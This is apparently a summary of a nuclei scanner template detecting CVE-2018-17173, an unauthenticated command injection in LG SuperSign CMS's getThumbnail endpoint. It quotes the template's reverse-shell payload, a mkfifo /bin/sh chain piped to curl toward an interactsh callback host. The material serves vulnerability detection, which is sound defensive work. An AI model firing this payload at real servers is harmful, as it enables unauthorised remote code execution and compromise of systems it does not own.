---
cve_id: CVE-2018-17173
template_path: nuclei-templates/http/cves/2018/CVE-2018-17173.yaml
affected_product: LG SuperSign CMS
severity: critical
authentication: none
external_callback: true
affected_versions: 2.5
preconditions: []
poc_classification: rce
---

## Vulnerability

CVE-2018-17173 is a critical remote code execution vulnerability in LG SuperSign CMS. The vulnerability exists in the `/qsr_server/device/getThumbnail` endpoint, which fails to properly sanitize the `sourceUri` parameter. Unauthenticated attackers can inject arbitrary system commands through this parameter, leading to complete server compromise. The vulnerability allows attackers to execute commands with the privileges of the web server process, potentially gaining full control over the LG SuperSign CMS server and access to connected digital signage systems. The CVSS score of 9.8 reflects the severity of this flaw, which requires no authentication, has low attack complexity, and impacts confidentiality, integrity, and availability.

## PoC / Detection

Classification: rce

The template detects CVE-2018-17173 by sending a crafted GET request to the vulnerable `/qsr_server/device/getThumbnail` endpoint. The `sourceUri` parameter contains an encoded payload that attempts to execute a reverse shell command chain: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|curl http://{{interactsh-url}} >/tmp/f`. This payload creates a named pipe and uses curl to make an HTTP request to an Interactsh callback server, demonstrating command execution capability. The template confirms successful exploitation by detecting either HTTP or DNS callbacks from the target server with a curl User-Agent string, proving that arbitrary commands were executed on the vulnerable system.

## References

- http://mamaquieroserpentester.blogspot.com/2018/09/lg-supersign-rce-to-luna-and-back-to.html
- http://packetstormsecurity.com/files/152733/LG-Supersign-EZ-CMS-Remote-Code-Execution.html
- https://www.exploit-db.com/exploits/45448/
- https://www.exploit-db.com/exploits/46795/
